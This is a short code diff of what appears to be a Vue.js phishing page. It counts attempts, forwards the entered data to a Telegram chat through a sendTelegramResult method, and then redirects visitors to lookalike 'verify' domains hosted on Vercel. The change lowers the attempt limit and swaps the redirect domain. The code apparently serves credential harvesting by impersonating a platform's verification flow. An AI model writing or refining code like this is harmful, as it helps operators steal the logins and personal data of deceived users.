@@ -202,7 +202,7 @@
     loading: false,
     isActive: false,
     count: 0,
-    finalCount: 3
+    finalCount: 2
     }
   },
   components: {
@@ -219,12 +219,11 @@
     await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
     this.isActive = !this.isActive
     }else{
-      location.replace("https://mata-verify.vercel.app/")
+      location.replace("https://mediacommm.vercel.app/")
   
     }
     },
     
-   
     async sendTelegramResult(chatId, message){ 
     try{
     
